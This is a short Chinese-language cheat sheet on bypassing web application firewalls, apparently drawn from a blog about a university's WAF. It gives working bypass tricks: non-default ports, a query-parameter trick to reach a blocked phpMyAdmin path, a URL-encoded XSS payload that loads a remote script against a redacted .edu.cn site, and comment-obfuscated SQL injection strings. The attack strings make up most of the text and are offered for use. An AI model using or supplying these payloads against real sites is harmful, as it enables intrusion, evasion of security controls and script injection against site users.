# 绕waf总结

---

## Reference
- [██大学通用型WAF不完全绕过(持续非定期更新) ](https://drivertom.blogspot.com/2018/12/waf.html)

---

**非默认端口导致完全绕过**

测试HTTPS服务
测试8080/8081等端口的服务

**路径限制绕过**

这只WAF会对访问敏感路径加以限制,但是加上参数可以绕过。
比如想访问`xxx.██.edu.cn/phpmyadmin/`会被拦截,访问`xxx.██.edu.cn/phpmyadmin/?id=1`可以绕过

**XSS防护绕过**

最直白的payload类似`<script> alert('xss'); </script>`
但是你可以用`<script src=来远程加载脚本,并绕过防护`
`http://██.██.edu.cn/██/██?search=naive%22%3E%20%3Cmeta%20name=%22referrer%22%20content=%22never%22%20%3E%20%3Cscript%20src=%22https://cdn.jsdelivr.net/gh/TomAPU/xsstest/test.js%22%3E%3C/script%3E%20%3C!--`

**SQL注入绕过**

Union注入时`union select 1 from 2`替换成`union/*fuckyou//*a*//*!select*/1/*fuckyou//*a*//*!from*/2`
order by测试时直接把空格换成`/**//**/`
